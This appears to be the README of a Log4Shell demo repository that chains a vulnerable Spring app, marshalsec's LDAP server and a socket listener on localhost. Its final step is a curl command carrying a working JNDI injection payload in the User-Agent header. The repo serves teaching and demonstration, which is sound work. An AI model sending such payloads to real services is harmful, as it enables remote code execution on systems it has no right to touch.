## Log4Shell Exploit Demo

🛑 _Code in this repo should be used for educational purposes only!_ 🛑  
🛑 _Do not use these attacks against services which are not under your control!_ 🛑

_Please see [references](#References) for initiating repos with Python samples and further information._

## Purpose

This repo mixes code from repos mentioned in the [references](#References) section to facilitate single language and tech stack (Java/Spring) demo of the exploit. To replay the demo, only Java and Maven have to be installed, though an IDE is recommended.

## Prerequisites

* Java 8+ (for Java8u191+ and Java 11.0+ see _Start_ Todos below)
* Maven 3+
* (Opt.) IntelliJ or Eclipse

### Install LDAP Ref Lib locally

* Clone https://github.com/mbechler/marshalsec
* Uncomment the `<artifactId>maven-assembly-plugin</artifactId>` in `pom.xml`
* Install library to local Maven Repo with `mvn clean install`

### Start Web Application with vulnerable Log4j

* With Java 11 or Java8u191+ (for other Java SDKs see [here](https://www.geekyhacker.com/2021/12/11/three-ways-to-patch-log4shell-cve-2021-44228-vulnerability/)), in Run Configuration, Add VM option `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`

### Start Exploit & LDAP Servers

* Run `L4sexploitApplication`

### Start Socketlistener

* Run `ExploitServer`

### Call Exploit

* Call `curl -A '${jndi:ldap://localhost:1389/a}' http://localhost:9090/`

### References

* Log4Shell-POC: https://github.com/kozmer/log4j-shell-poc
* Web Appication: https://github.com/korteke/log4shell-demo
* LDAP Serialization Hack: https://github.com/mbechler/marshalsec

### To use locally generated marshalsec Maven Artifact

```xml
<dependency>
  <groupId>org.eenterphace.mbechler</groupId>
  <artifactId>marshalsec</artifactId>
  <version>0.0.3-SNAPSHOT</version>
</dependency>
```
